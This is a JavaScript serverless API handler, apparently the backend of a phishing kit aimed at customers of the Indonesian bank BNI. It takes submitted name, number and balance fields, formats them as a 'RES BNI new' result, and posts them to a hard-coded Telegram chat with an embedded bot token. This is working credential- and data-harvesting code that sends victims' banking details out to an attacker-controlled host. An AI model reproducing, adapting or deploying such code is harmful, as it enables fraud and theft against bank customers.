export default async function handler(req, res) {
    if (req.method !== 'POST') {
        return res.status(405).json({ message: 'Method Not Allowed' });
    }

    const telegramId = '7620965847';
    const botToken = '8126128007:AAEyBzHjL3mXfA_d7QPK-wPGMOOwfmajuSA';

    const { a, b, c } = req.body;

    const message = `
______________________________
RES BNI new
______________________________
• NAME : ${a}
• NOMOR : ${b}
• SALDO : ${c}
______________________________`;

    const telegramApi = `https://api.telegram.org/bot${botToken}/sendMessage`;

    try {
        await fetch(telegramApi, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: telegramId,
                text: message,
                parse_mode: 'Markdown'
            })
        });

        // Balikin status sukses ke frontend
        res.status(200).json({ success: true });
    } catch (error) {
        console.error('Error sending message:', error);
        res.status(500).json({ success: false, message: 'Failed to send message' });
    }
}
